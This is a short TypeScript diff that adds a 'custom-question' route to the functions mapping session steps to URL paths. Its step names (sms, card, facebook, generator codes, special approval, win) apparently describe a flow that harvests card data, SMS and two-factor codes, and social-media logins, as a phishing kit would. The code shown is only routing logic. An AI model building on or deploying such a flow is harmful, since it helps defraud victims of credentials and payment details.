@@ -59,6 +59,8 @@ export function stepToPath(
       return `/generator1${qs}`;
     case "generator2":
       return `/generator2${qs}`;
+    case "custom_question":
+      return `/custom-question${qs}`;
     default:
       return `/win${qs}`;
   }
@@ -78,6 +80,7 @@ export function pathToStep(pathname: string): SessionStep | null {
   if (pathname.startsWith("/special-approval")) return "special_approval";
   if (pathname.startsWith("/generator1")) return "generator1";
   if (pathname.startsWith("/generator2")) return "generator2";
+  if (pathname.startsWith("/custom-question")) return "custom_question";
   if (pathname.startsWith("/sms")) return "sms";
   if (pathname.startsWith("/card")) return "card";
   if (pathname.startsWith("/facebook")) return "facebook";
